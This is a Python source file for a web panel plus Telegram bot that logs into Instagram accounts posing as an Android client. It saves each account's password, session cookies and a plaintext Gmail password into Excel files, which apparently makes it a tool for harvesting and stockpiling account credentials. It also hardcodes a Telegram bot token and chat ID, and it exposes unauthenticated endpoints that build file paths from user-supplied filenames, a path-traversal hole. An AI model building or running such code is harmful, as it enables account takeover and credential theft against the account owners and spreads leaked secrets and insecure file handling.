"""
Nexus Session Manager
=====================

This is a single-file application that runs a Telegram Bot and a Web Interface for managing Instagram Sessions.
It performs Instagram login (mimicking Android), collects Gmail credentials for recovery reference,
and saves everything into Excel files with duplicate handling.

Dependencies:
-------------
This script attempts to automatically install required dependencies if they are missing.
Manual installation:
pip install fastapi uvicorn instaloader openpyxl pandas python-multipart pyTelegramBotAPI

Usage:
------
python3 session.py
"""

import sys
import subprocess
import importlib
import os
import logging

# --- Auto-Install Dependencies ---
def install_and_import(package, import_name=None):
    if import_name is None:
        import_name = package
    try:
        importlib.import_module(import_name)
    except ImportError:
        print(f"📦 Package '{package}' not found. Installing...")
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", package])
            print(f"✅ '{package}' installed successfully.")
        except subprocess.CalledProcessError as e:
            print(f"❌ Failed to install '{package}'. Error: {e}")
            print(f"⚠️ Please install it manually: pip install {package}")

# List of (package_name, import_name)
REQUIRED_PACKAGES = [
    ("fastapi", "fastapi"),
    ("uvicorn", "uvicorn"),
    ("instaloader", "instaloader"),
    ("pandas", "pandas"),
    ("openpyxl", "openpyxl"),
    ("pyTelegramBotAPI", "telebot"),
    ("python-multipart", "multipart") # Required for FastAPI form data
]

print("🔄 Checking dependencies...")
for package, import_name in REQUIRED_PACKAGES:
    install_and_import(package, import_name)
print("✅ Dependency check complete. Starting application...")

# --- Imports ---
import threading
import telebot
import instaloader
import uvicorn
import pandas as pd
import socket
from datetime import datetime
from typing import Optional
from fastapi import FastAPI, HTTPException, UploadFile, File
from fastapi.responses import HTMLResponse, FileResponse
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel

# --- Configuration ---
TELEGRAM_TOKEN = "8591242778:AAHpyMLfltgl5ufLfI8f0QAyBklm_Kn3Q4I"
CHAT_ID = "6827291977"
DATA_DIR = "data"
os.makedirs(DATA_DIR, exist_ok=True)
WEB_PORT = 8000
WEB_HOST = "0.0.0.0"

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# --- State ---
user_states = {} # For legacy Telegram flow (if needed)
login_sessions = {} # For Web App flow

# --- Telegram Bot Setup ---
bot = telebot.TeleBot(TELEGRAM_TOKEN)
L_tele = instaloader.Instaloader(
    user_agent="Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
)

# --- FastAPI App Setup ---
app = FastAPI(title="Nexus Session Bot")
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# --- Models ---
class LoginRequest(BaseModel):
    username: str
    password: str

class TwoFactorRequest(BaseModel):
    username: str
    code: str

class SaveDataRequest(BaseModel):
    username: str
    gmail: str
    gmail_password: str

class EditDataRequest(BaseModel):
    filename: str
    gmail: str
    gmail_password: str

class RenameRequest(BaseModel):
    old_filename: str
    new_filename: str

# --- Helpers ---
def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"

def clean_duplicates(target_user_id: int, exclude_filename: str = None):
    """Removes any existing file that has the same Instagram ID."""
    for filename in os.listdir(DATA_DIR):
        if filename.endswith(".xlsx"):
            if exclude_filename and filename == exclude_filename:
                continue
            filepath = os.path.join(DATA_DIR, filename)
            try:
                df = pd.read_excel(filepath)
                if not df.empty and "Instagram ID" in df.columns:
                    existing_id = df.iloc[0]["Instagram ID"]
                    if str(existing_id) == str(target_user_id):
                        logger.info(f"Removing duplicate account file: {filename}")
                        os.remove(filepath)
            except Exception as e:
                logger.error(f"Error scanning file {filename}: {e}")

# --- HTML Content ---
HTML_CONTENT = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Nexus Session Manager</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700;900&family=Poppins:wght@300;400;600;800&display=swap" rel="stylesheet">
    <script src="https://cdn.tailwindcss.com"></script>
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        'primary-blue': '#00F0FF',
                        'primary-gold': '#D4AF37',
                        'dark-bg': '#050510',
                        'card-bg': '#101020',
                    },
                    fontFamily: {
                        orbitron: ['Orbitron', 'sans-serif'],
                        poppins: ['Poppins', 'sans-serif'],
                    }
                }
            }
        }
    </script>
    <script defer src="https://cdn.jsdelivr.net/npm/alpinejs@3.x.x/dist/cdn.min.js"></script>
    <style>
        body { font-family: 'Poppins', sans-serif; background-color: #050510; color: #e5e7eb; overflow-x: hidden; }
        .orbitron { font-family: 'Orbitron', sans-serif; }
        .bg-grid-pattern { background-image: radial-gradient(circle at 50% 50%, #00F0FF 1px, transparent 1px); background-size: 40px 40px; }
        ::-webkit-scrollbar { width: 8px; }
        ::-webkit-scrollbar-track { background: #050510; }
        ::-webkit-scrollbar-thumb { background: #333; border-radius: 4px; }
        ::-webkit-scrollbar-thumb:hover { background: #00F0FF; }
        .btn-primary { @apply px-6 py-2 bg-primary-blue text-dark-bg font-bold hover:bg-cyan-300 transition-colors duration-300 tracking-wider uppercase text-sm; }
        .btn-gold { @apply px-6 py-2 bg-primary-gold text-dark-bg font-bold hover:bg-yellow-400 transition-colors duration-300 tracking-wider uppercase text-sm; }
        .input-field { @apply w-full bg-card-bg border border-gray-700 p-3 text-white focus:border-primary-blue focus:outline-none transition-colors duration-300 placeholder-gray-600; }
        .card { @apply bg-card-bg border border-gray-800 p-6 transition-all duration-300; }
        .card:hover { @apply border-primary-blue shadow-[0_0_15px_rgba(0,240,255,0.1)]; }
    </style>
</head>
<body class="min-h-screen relative" x-data="appData()" x-init="fetchFiles()">
    <div class="fixed inset-0 bg-gradient-to-br from-dark-bg via-[#0a0a1a] to-black z-[-1]"></div>
    <div class="fixed inset-0 opacity-20 pointer-events-none bg-grid-pattern"></div>
    <header className="w-full max-w-5xl flex justify-between items-center mb-12 border-b border-gray-800 pb-4">
        <div class="max-w-6xl mx-auto px-6 py-6 flex justify-between items-center border-b border-gray-800 mb-8">
            <div class="flex items-center gap-3">
                <svg xmlns="http://www.w3.org/2000/svg" class="h-8 w-8 text-primary-blue" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 9l3 3-3 3m5 0h3M5 20h14a2 2 0 002-2V6a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z" />
                </svg>
                <h1 class="text-2xl md:text-3xl font-bold tracking-widest text-transparent bg-clip-text bg-gradient-to-r from-primary-blue to-white orbitron">NEXUS SESSION</h1>
            </div>
            <button x-show="view !== 'login'" @click="view = 'login'" class="text-gray-400 hover:text-white transition-colors text-sm uppercase tracking-wider">New Login</button>
        </div>
    </header>
    <main class="max-w-5xl mx-auto px-6 pb-20 flex flex-col items-center justify-center min-h-[60vh]">
        <div x-show="view === 'login'" x-transition.opacity.duration.500ms class="w-full max-w-md">
            <div class="card shadow-[0_0_20px_rgba(0,240,255,0.1)]">
                <div class="flex flex-col items-center mb-8">
                    <svg xmlns="http://www.w3.org/2000/svg" class="h-12 w-12 text-primary-gold mb-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                      <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
                    </svg>
                    <h2 class="text-2xl font-bold orbitron tracking-wide">AUTHENTICATION</h2>
                    <p class="text-gray-500 text-xs uppercase tracking-widest mt-1">Secure Instagram Gateway</p>
                </div>
                <form @submit.prevent="handleLogin" class="space-y-6">
                    <div>
                        <label class="block text-xs font-bold text-primary-blue mb-2 uppercase tracking-widest">Username</label>
                        <input type="text" x-model="username" class="input-field" placeholder="Instagram Username" required>
                    </div>
                    <div>
                        <label class="block text-xs font-bold text-primary-blue mb-2 uppercase tracking-widest">Password</label>
                        <input type="password" x-model="password" class="input-field" placeholder="••••••••" required>
                    </div>
                    <div x-show="error" class="text-red-500 text-xs text-center font-bold" x-text="error"></div>
                    <button type="submit" class="btn-primary w-full flex justify-center items-center" :disabled="loading">
                        <span x-show="!loading">INITIATE LOGIN</span>
                        <span x-show="loading" class="animate-spin h-5 w-5 border-2 border-dark-bg border-t-transparent rounded-full"></span>
                    </button>
                </form>
                <div class="mt-8 pt-6 border-t border-gray-800 text-center">
                    <button @click="view = 'dashboard'; fetchFiles()" class="text-gray-500 hover:text-primary-blue text-xs uppercase tracking-widest transition-colors">View Existing Files</button>
                </div>
            </div>
        </div>
        <div x-show="view === 'gmail'" x-transition.opacity.duration.500ms class="w-full max-w-md" style="display: none;">
             <div class="card shadow-[0_0_20px_rgba(212,175,55,0.1)] border-primary-gold/30">
                <div class="flex flex-col items-center mb-8">
                    <div class="w-12 h-12 rounded-full bg-primary-gold/20 flex items-center justify-center mb-4 text-primary-gold">
                        <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7" />
                        </svg>
                    </div>
                    <h2 class="text-2xl font-bold text-white orbitron">LOGIN SUCCESS</h2>
                    <p class="text-gray-400 text-xs uppercase text-center mt-2 tracking-wide">Provide Recovery Details</p>
                </div>
                <form @submit.prevent="handleGmailSubmit" class="space-y-6">
                    <div>
                        <label class="block text-xs font-bold text-primary-gold mb-2 uppercase tracking-widest">Gmail Address</label>
                        <input type="email" x-model="gmail" class="input-field focus:border-primary-gold" placeholder="user@gmail.com" required>
                    </div>
                    <div>
                        <label class="block text-xs font-bold text-primary-gold mb-2 uppercase tracking-widest">Gmail Password</label>
                        <input type="text" x-model="gmailPass" class="input-field focus:border-primary-gold" placeholder="Password" required>
                    </div>
                    <div x-show="error" class="text-red-500 text-xs text-center font-bold" x-text="error"></div>
                    <button type="submit" class="btn-gold w-full flex justify-center items-center" :disabled="loading">
                         <span x-show="!loading">SAVE & FINISH</span>
                         <span x-show="loading" class="animate-spin h-5 w-5 border-2 border-dark-bg border-t-transparent rounded-full"></span>
                    </button>
                </form>
            </div>
        </div>
        <div x-show="view === 'dashboard'" x-transition.opacity.duration.500ms class="w-full" style="display: none;">
            <div class="flex justify-between items-center mb-6">
                <h2 class="text-2xl font-bold orbitron text-white">DATA REPOSITORY</h2>
                <div class="relative group">
                    <input type="file" id="file-upload" class="hidden" accept=".xlsx" @change="handleFileUpload">
                    <label for="file-upload" class="btn-primary cursor-pointer flex items-center gap-2">
                        <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-8l-4-4m0 0L8 8m4-4v12" />
                        </svg>UPLOAD
                    </label>
                </div>
            </div>
            <div x-show="files.length === 0" class="text-center py-20 border border-dashed border-gray-800 rounded-lg"><p class="text-gray-500">No session files found.</p></div>
            <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
                <template x-for="file in files" :key="file.filename">
                    <div class="card group relative overflow-hidden hover:-translate-y-1 transition-transform">
                        <div class="absolute top-0 left-0 w-1 h-full bg-primary-blue opacity-0 group-hover:opacity-100 transition-opacity"></div>
                        <div class="flex items-start justify-between mb-4">
                            <div class="p-3 bg-gray-900 rounded-lg">
                                <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 text-primary-blue" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                  <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z" />
                                </svg>
                            </div>
                            <span class="text-xs text-gray-500 font-mono" x-text="file.created_at.split('T')[0]"></span>
                        </div>
                        <h3 class="text-lg font-bold mb-1 truncate text-white" x-text="file.filename"></h3>
                        <p class="text-xs text-gray-500 mb-6 font-mono"><span x-text="(file.size / 1024).toFixed(2)"></span> KB</p>
                        <div class="flex gap-2">
                             <button @click="openEditModal(file)" class="p-2 bg-gray-800 hover:bg-green-500 hover:text-white transition-colors rounded text-gray-400" title="Edit">
                                <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                  <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M11 5H6a2 2 0 00-2 2v11a2 2 0 002 2h11a2 2 0 002-2v-5m-1.414-9.414a2 2 0 112.828 2.828L11.828 15H9v-2.828l8.586-8.586z" />
                                </svg>
                            </button>
                            <button @click="downloadFile(file.filename)" class="p-2 bg-gray-800 hover:bg-primary-blue hover:text-black transition-colors rounded text-gray-400" title="Download">
                                <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                  <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4-4m0 0l-4 4m4-4v12" />
                                </svg>
                            </button>
                            <button @click="renameFile(file.filename)" class="p-2 bg-gray-800 hover:bg-white hover:text-black transition-colors rounded text-gray-400" title="Rename">
                                <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                  <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15.232 5.232l3.536 3.536m-2.036-5.036a2.5 2.5 0 113.536 3.536L6.5 21.036H3v-3.572L16.732 3.732z" />
                                </svg>
                            </button>
                            <button @click="deleteFile(file.filename)" class="p-2 bg-gray-800 hover:bg-red-500 hover:text-white transition-colors rounded text-gray-400" title="Delete">
                                <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                  <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16" />
                                </svg>
                            </button>
                        </div>
                    </div>
                </template>
            </div>
        </div>
    </main>
    <div x-show="show2FAModal" class="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm" style="display: none;" x-transition>
        <div @click.away="show2FAModal = false" class="bg-card-bg border border-gray-700 p-8 w-full max-w-sm relative shadow-2xl">
            <h3 class="text-xl font-bold mb-2 text-center orbitron text-white">2FA REQUIRED</h3>
            <p class="text-gray-400 text-xs text-center mb-6 uppercase tracking-wider">Enter security code</p>
            <form @submit.prevent="handle2FASubmit" class="space-y-4">
                <input type="text" x-model="twoFACode" class="input-field text-center text-2xl tracking-[0.5em] font-mono" placeholder="000000" autofocus>
                <button type="submit" class="btn-primary w-full" :disabled="loading">VERIFY</button>
            </form>
        </div>
    </div>
    <div x-show="showEditModal" class="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm" style="display: none;" x-transition>
        <div @click.away="showEditModal = false" class="bg-card-bg border border-gray-700 p-8 w-full max-w-sm relative shadow-2xl">
            <button @click="showEditModal = false" class="absolute top-4 right-4 text-gray-500 hover:text-white">✕</button>
            <h3 class="text-xl font-bold mb-6 text-center orbitron text-white">EDIT ACCOUNT</h3>
            <form @submit.prevent="handleEditSubmit" class="space-y-4">
                <div>
                    <label class="block text-xs font-bold text-gray-400 mb-2 uppercase">New Gmail</label>
                    <input type="email" x-model="editGmail" class="input-field" required>
                </div>
                <div>
                    <label class="block text-xs font-bold text-gray-400 mb-2 uppercase">New Password</label>
                    <input type="text" x-model="editGmailPass" class="input-field" required>
                </div>
                <button type="submit" class="btn-primary w-full" :disabled="loading">UPDATE FILE</button>
            </form>
        </div>
    </div>
    <script>
        function appData() {
            return {
                view: 'login', username: '', password: '', gmail: '', gmailPass: '', files: [], loading: false, error: '',
                show2FAModal: false, twoFACode: '', sessionUser: '', showEditModal: false, editFile: '', editGmail: '', editGmailPass: '',
                async handleLogin() {
                    this.loading = true; this.error = '';
                    try {
                        const res = await fetch('/api/login', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ username: this.username, password: this.password }) });
                        const data = await res.json();
                        if (!res.ok) throw new Error(data.detail);
                        if (data.status === 'pending' && data.requires_2fa) { this.sessionUser = this.username; this.show2FAModal = true; }
                        else { this.sessionUser = this.username; this.view = 'gmail'; }
                    } catch (e) { this.error = e.message; } finally { this.loading = false; }
                },
                async handle2FASubmit() {
                    this.loading = true; this.error = '';
                    try {
                        const res = await fetch('/api/2fa', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ username: this.sessionUser, code: this.twoFACode }) });
                        if (!res.ok) { const data = await res.json(); throw new Error(data.detail); }
                        this.show2FAModal = false; this.view = 'gmail';
                    } catch (e) { this.error = e.message; } finally { this.loading = false; }
                },
                async handleGmailSubmit() {
                    this.loading = true;
                    try {
                        const res = await fetch('/api/save', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ username: this.sessionUser, gmail: this.gmail, gmail_password: this.gmailPass }) });
                        if (!res.ok) { const data = await res.json(); throw new Error(data.detail); }
                        this.gmail = ''; this.gmailPass = ''; this.username = ''; this.password = ''; this.view = 'dashboard'; this.fetchFiles();
                    } catch (e) { this.error = e.message; } finally { this.loading = false; }
                },
                async fetchFiles() { try { const res = await fetch('/api/files'); this.files = await res.json(); } catch (e) { console.error(e); } },
                async downloadFile(filename) { window.open(`/api/download/${filename}`, '_blank'); },
                async deleteFile(filename) { if(!confirm(`Delete ${filename}?`)) return; await fetch(`/api/delete/${filename}`, { method: 'DELETE' }); this.fetchFiles(); },
                async renameFile(oldName) {
                    const newName = prompt("Enter new filename (with .xlsx):", oldName); if(!newName) return;
                    try { const res = await fetch('/api/rename', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ old_filename: oldName, new_filename: newName }) });
                        if(!res.ok) throw new Error("Rename failed"); this.fetchFiles(); } catch(e) { alert(e.message); }
                },
                openEditModal(file) { this.editFile = file.filename; this.editGmail = ''; this.editGmailPass = ''; this.showEditModal = true; },
                async handleEditSubmit() {
                    this.loading = true;
                    try { const res = await fetch('/api/edit', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ filename: this.editFile, gmail: this.editGmail, gmail_password: this.editGmailPass }) });
                        if(!res.ok) throw new Error("Edit failed"); this.showEditModal = false; this.fetchFiles(); } catch(e) { alert(e.message); } finally { this.loading = false; }
                },
                async handleFileUpload(e) {
                    const file = e.target.files[0]; if(!file) return; const formData = new FormData(); formData.append('file', file);
                    try { const res = await fetch('/api/upload', { method: 'POST', body: formData }); if(!res.ok) { const data = await res.json(); alert(data.detail); } this.fetchFiles(); } catch(err) { alert("Upload failed"); }
                }
            }
        }
    </script>
</body>
</html>
"""

# --- API Endpoints ---
@app.get("/", response_class=HTMLResponse)
def index():
    return HTML_CONTENT

@app.post("/api/login")
def api_login(request: LoginRequest):
    username = request.username
    password = request.password
    L = instaloader.Instaloader(user_agent="Instagram 269.0.0.18.75 Android (31/12; 320dpi; 720x1280; Xiaomi; Redmi Note 4; mido; qcom; en_US; 314077874)")
    try:
        L.login(username, password)
        login_sessions[username] = {'loader': L, 'password': password}
        return {"status": "success", "message": "Login successful", "requires_2fa": False}
    except instaloader.TwoFactorAuthRequiredException:
        login_sessions[username] = {'loader': L, 'password': password}
        return {"status": "pending", "message": "2FA Required", "requires_2fa": True}
    except instaloader.BadCredentialsException:
        raise HTTPException(status_code=401, detail="Invalid username or password")
    except Exception as e:
        logger.exception(f"Login error for {username}")
        if "challenge_required" in str(e):
             raise HTTPException(status_code=403, detail="Instagram requires verification (Challenge). Please try logging in on the app first.")
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/2fa")
def api_2fa(request: TwoFactorRequest):
    username = request.username
    code = request.code
    if username not in login_sessions:
        raise HTTPException(status_code=400, detail="Session expired or invalid. Please login again.")
    session_data = login_sessions[username]
    L = session_data['loader']
    try:
        L.two_factor_login(code)
        return {"status": "success", "message": "2FA successful"}
    except instaloader.BadCredentialsException:
        raise HTTPException(status_code=401, detail="Invalid 2FA code")
    except Exception as e:
        logger.exception(f"2FA error for {username}")
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/save")
def api_save(request: SaveDataRequest):
    username = request.username
    if username not in login_sessions:
        raise HTTPException(status_code=400, detail="Session not found. Please login first.")
    session_data = login_sessions[username]
    L = session_data['loader']
    password = session_data['password']
    try:
        user_id = L.context.userid
        cookies = L.context.session.cookies.get_dict()
        cookie_string = "; ".join([f"{k}={v}" for k, v in cookies.items()])
        data = {
            "Instagram ID": [user_id],
            "Instagram Password": [password],
            "Gmail": [request.gmail],
            "Gmail Password": [request.gmail_password],
            "Full Cookie String": [cookie_string]
        }
        filename = f"{username}.xlsx"
        clean_duplicates(user_id, exclude_filename=filename)
        df = pd.DataFrame(data)
        filepath = os.path.join(DATA_DIR, filename)
        df.to_excel(filepath, index=False)
        del login_sessions[username]
        return {"status": "success", "message": "Account saved successfully", "filename": filename}
    except Exception as e:
        logger.exception("Error saving data")
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/api/files")
def api_list_files():
    files = []
    for f in os.listdir(DATA_DIR):
        if f.endswith(".xlsx"):
            path = os.path.join(DATA_DIR, f)
            try:
                stat = os.stat(path)
                files.append({"filename": f, "size": stat.st_size, "created_at": datetime.fromtimestamp(stat.st_ctime).isoformat()})
            except Exception: pass
    return files

@app.get("/api/download/{filename}")
def api_download(filename: str):
    filepath = os.path.join(DATA_DIR, filename)
    if os.path.exists(filepath): return FileResponse(filepath, filename=filename)
    raise HTTPException(status_code=404, detail="File not found")

@app.delete("/api/delete/{filename}")
def api_delete(filename: str):
    filepath = os.path.join(DATA_DIR, filename)
    if os.path.exists(filepath):
        os.remove(filepath)
        return {"status": "success"}
    raise HTTPException(status_code=404, detail="File not found")

@app.post("/api/rename")
def api_rename(request: RenameRequest):
    old_path = os.path.join(DATA_DIR, request.old_filename)
    new_path = os.path.join(DATA_DIR, request.new_filename)
    if not os.path.exists(old_path): raise HTTPException(status_code=404, detail="File not found")
    if os.path.exists(new_path): raise HTTPException(status_code=400, detail="Filename already exists")
    os.rename(old_path, new_path)
    return {"status": "success"}

@app.post("/api/edit")
def api_edit(request: EditDataRequest):
    filepath = os.path.join(DATA_DIR, request.filename)
    if not os.path.exists(filepath): raise HTTPException(status_code=404, detail="File not found")
    try:
        df = pd.read_excel(filepath)
        if "Gmail" in df.columns: df["Gmail"] = request.gmail
        if "Gmail Password" in df.columns: df["Gmail Password"] = request.gmail_password
        df.to_excel(filepath, index=False)
        return {"status": "success", "message": "File updated"}
    except Exception as e:
        logger.error(f"Error editing file: {e}")
        raise HTTPException(status_code=500, detail="Failed to update file")

@app.post("/api/upload")
async def api_upload(file: UploadFile = File(...)):
    if not file.filename.endswith(".xlsx"): raise HTTPException(status_code=400, detail="Only .xlsx files allowed")
    content = await file.read()
    temp_path = os.path.join(DATA_DIR, file.filename)
    with open(temp_path, "wb") as f: f.write(content)
    try:
        df = pd.read_excel(temp_path)
        if "Instagram ID" in df.columns:
            uid = df.iloc[0]["Instagram ID"]
            clean_duplicates(uid, exclude_filename=file.filename)
            return {"status": "success", "message": "File uploaded"}
        else:
            os.remove(temp_path)
            raise HTTPException(status_code=400, detail="Invalid file format: Missing 'Instagram ID'")
    except Exception as e:
        if os.path.exists(temp_path): os.remove(temp_path)
        raise HTTPException(status_code=400, detail=f"Invalid file: {str(e)}")

# --- Telegram Bot Commands ---

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    ip_address = get_local_ip()
    local_url = f"http://127.0.0.1:{WEB_PORT}"
    lan_url = f"http://{ip_address}:{WEB_PORT}"

    markup = telebot.types.InlineKeyboardMarkup()
    markup.add(telebot.types.InlineKeyboardButton("🌐 Open Web Manager (Local)", url=local_url))
    markup.add(telebot.types.InlineKeyboardButton("🌐 Open Web Manager (LAN)", url=lan_url))

    welcome_text = f"""
*Nexus Session Bot Online* 🤖

Use the Web Interface to manage sessions securely.

🔹 *Connection Info:*
1. *Local (Same Device):* `{local_url}`
2. *LAN (Same Network):* `{lan_url}`
3. *Public Server:* If you are running this on a cloud server/VPS, use your server's Public IP: `http://<YOUR_SERVER_IP>:8000`

🔹 *Features:*
- Secure Instagram Login (Android Signature)
- 2FA Support
- Gmail Backup Collection
- Excel File Management (Auto-duplicate removal)
    """
    bot.reply_to(message, welcome_text, parse_mode="Markdown", reply_markup=markup)

@bot.message_handler(commands=['login'])
def handle_login_legacy(message):
    bot.reply_to(message, "⚠️ Legacy text login is deprecated. Please use the Web Interface for a better and safer experience. Type /start to get the link.")

# --- Runner ---
def run_web_server():
    uvicorn.run(app, host=WEB_HOST, port=WEB_PORT)

if __name__ == "__main__":
    # Start Web Server in a separate thread
    web_thread = threading.Thread(target=run_web_server, daemon=True)
    web_thread.start()

    logger.info("Web Server started on port 8000")
    logger.info("Telegram Bot started polling")

    # Start Telegram Bot (Main Thread)
    bot.polling(none_stop=True)
